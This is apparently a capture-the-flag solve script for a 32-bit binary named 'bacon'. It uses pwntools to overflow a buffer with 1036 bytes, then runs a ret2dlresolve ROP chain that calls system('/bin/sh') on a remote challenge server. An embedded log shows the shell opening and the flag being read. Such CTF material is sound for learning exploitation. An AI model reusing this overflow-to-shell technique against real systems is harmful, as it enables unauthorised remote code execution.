from pwn import *


p = remote("jh2i.com", 50032)

rop = ROP("bacon")
elf = ELF("bacon")

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()

pause()
payload = b"A"*1036
payload += raw_rop
payload += dlresolve.payload

p.send(payload)
'''
0 [07:39:10] vagrant@oracle(oracle) pwn> python3 bacon.py 
[+] Opening connection to jh2i.com on port 50032: Done
[*] '/home/vagrant/CTFs/hacktivity/pwn/bacon'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loading gadgets for '/home/vagrant/CTFs/hacktivity/pwn/bacon'
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ ls
bacon
flag.txt
$ cat flag.txt
flag{don't_forget_to_take_out_the_grease}
$ 
[*] Interrupted
'''

p.interactive()
